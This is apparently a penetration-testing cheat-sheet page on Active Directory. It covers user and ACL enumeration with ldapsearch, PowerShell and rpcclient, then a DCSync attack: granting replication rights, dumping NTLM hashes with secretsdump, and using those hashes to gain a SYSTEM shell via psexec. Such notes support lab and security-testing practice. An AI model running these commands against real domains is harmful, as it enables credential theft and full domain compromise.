---
layout: default
title: Active Directory
parent: ENUMERATION
has_children: false
has_toc: false
---

{% include toc.html %}

## References

[VbScrub's YouTube channel](https://www.youtube.com/channel/UCpoyhjwNIWZmsiKNKpsMAQQ)

[Searching LDAP](https://devconnected.com/how-to-search-ldap-using-ldapsearch-examples/)

[Enumerating user accounts](https://carnal0wnage.attackresearch.com/2007/07/enumerating-user-accounts-on-linux-and.html)

[Enumerating with RPCClient](https://ired.team/offensive-security/enumeration-and-discovery/enumerating-windows-domains-using-rpcclient-through-socksproxy-bypassing-command-line-logging)

[Authenticated SMB sessions](https://www.sans.org/blog/plundering-windows-account-info-via-authenticated-smb-sessions/)

[Resetting AD user password with Linux](https://malicious.link/post/2017/reset-ad-user-password-with-linux/)

## User enumeration
You won't get much without credentials, although you may get usernames which you could use with Kerbrute (see [here](kerberos.md)). Using `ldapsearch` with filters:
```bash
// Enumerating the domain root without credentials.
ldapsearch -H ldap://domain.local -x -b "dc=domain,dc=local"
```

If you have an account to work with your results should improve:
```bash
// This will include people and computers.
ldapsearch -H ldap://domain.local -x -D "user@domain.local" -w 'pass' -b "DC=domain,DC=local" "(ObjectClass=person)"

// This will include people and exclude computers.
ldapsearch -H ldap://domain.local -x -D "user@domain.local" -w 'pass' -b "DC=egotistical-bank,DC=local" "(&(ObjectClass=person)(!(ObjectClass=computer)))"

// Return only the requested attributes.
ldapsearch -H ldap://domain.local -x -D "user@domain.local" -w 'pass' -b "DC=egotistical-bank,DC=local" "(&(ObjectClass=person)(!(ObjectClass=computer)))" name samaccountname memberof
```

Enumerating users with Powershell:
```powershell
PS C:\> Import-Module ActiveDirectory
PS C:\> Get-ADUser -LDAPFilter "(ServicePrincipalName=*)"

// Will include computers.
PS C:\> Get-ADObject -LDAPFilter "(objectclass=user)"

// Will include users only.
PS C:\> Get-ADObject -LDAPFilter "(objectcategory=user)"

// Will include users and exclude computers.
PS C:\> Get-ADObject -LDAPFilter "(&(!(objectclass=computer)(objectclass=user)))"

// All SAM accounts.
PS C:\> Get-ADObject -LDAPFilter "(samaccountname=*)"

// Any user accounts ending in Smith.
PS C:\> Get-ADObject -LDAPFilter "(samaccountname=*Smith)"

// Return only the requested attributes.
PS C:\> Get-ADObject -LDAPFilter "(samaccountname=*Smith)" -Properties cn,objectsid,description,givenname,sn
```

Enumerating users with `rpcclient`:
```
// Can try with a null bind.
rpcclient -U '' -N 10.x.x.x
rpcclient -U '%' 10.x.x.x

// If you have credentials.
rpcclient -U 'user@domain.local%pass' 10.x.x.x

// Enumeration.
rpcclient $> enumdomusers
rpcclient $> queryuser Guest
```

Using `impacket`:
```bash
// Using null bind.
GetADUsers.py -all -dc-ip 10.x.x.x domain.local/

// With NTLM hashes.
GetADUsers.py -all -hashes aad3b435b51xxxxxxxxxxxx5b51404ee:58a52d36xxxxxxxxxxxxab9a201db1dd -dc-ip 10.x.x.x domain.local/
```

## Enumerating ACLs
To query ACLs, `dsacls` is the most usable:
```
dsacls DC=EGOTISTICAL-BANK,DC=LOCAL
```

PowerShell version:
```powershell
// Need to import the AD module first.
PS C:\> Import-Module ActiveDirectory

// Get ACLs.
PS C:\> Get-ACL
PS C:\> Get-ACL "AD:\DC=domain,DC=local"
PS C:\> Get-ACL "AD:\DC=domain,DC=local" | Select-Object -ExpandProperty Access

// With LDAP filter
PS C:\> Get-ADObject -LDAPFilter "(samaccountname=*Smith)" -Properties cn,objectsid,description,givenname,sn
```

## DC Sync Attack and Pass-the-Hash
If the account you are using has - or can get - permissions to sync with other domain controllers, you can impersonate a DC and sync the secrets database. Once you have the secrets, you can authenticate as another account by passing the account's hash. For this attack to work, you need to know the password for the account you are using, and the following permissions granted to the account (or be able to grant them):

```csharp
// Allows you to sync changes and impersonate a DC.
"Replicating Directory Changes"
"Replicating Directory Changes All"

// If you don't have the above permissions, but you do have this one,
// you may be able to grant them on the account you are using.
"Windows Exchange Permissions"
```

The best way to see if your account has these permissions set is to use:
```csharp
dsacls "DC=egotistical-bank,DC=local"
```

An alternative approach, although the output is horrendous (the output only contains `GUIDs` which require further lookups to resolve them to actual permissions), is:
```powershell
PS C:\> Get-ACL "AD:\DC=egotistical-bank,DC=local" | Select-Object -ExpandProperty Access
```

If you don't have the permissions, you may be able to add them using:
```powershell
PS C:\> Add-DomainObjectAcl -TargetIdentity "DC=egotistical-bank,DC=local" -PrincipalIdentity svc_loanmgr -Rights DCSync
```

If you're in luck and your account has the assigned permissions, you may be able to dump the secrets using:
```csharp
secretsdump.py -just-dc-ntlm domain.local/username@10.x.x.x
```

If successful, you now have the domain secrets which can be used to pass-the-hash. To do that, use `CrackMapExec` to check if you can pass-the-hash:
```csharp
crackmapexec smb 10.x.x.x -u Administrator -H aad3b435b51404xxxxxxxxxxxx1404ee:d9485863c1exxxxxxxxxxxxbb4ab9dff
```

If you see `(Pwn3d!)` next to the account the attack worked. To take advantage and return a privileged shell, use `psexec.py`:
```
psexec.py -hashes aad3b435b51404xxxxxxxxxxxx1404ee:d9485863c1exxxxxxxxxxxxbb4ab9dff Administrator@10.x.x.x

Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.x.x.x.....
[*] Found writable share ADMIN$
[*] Uploading file VZBmPKju.exe
[*] Opening SVCManager on 10.x.x.x.....
[*] Creating service jluB on 10.x.x.x.....
[*] Starting service jluB.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.973]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```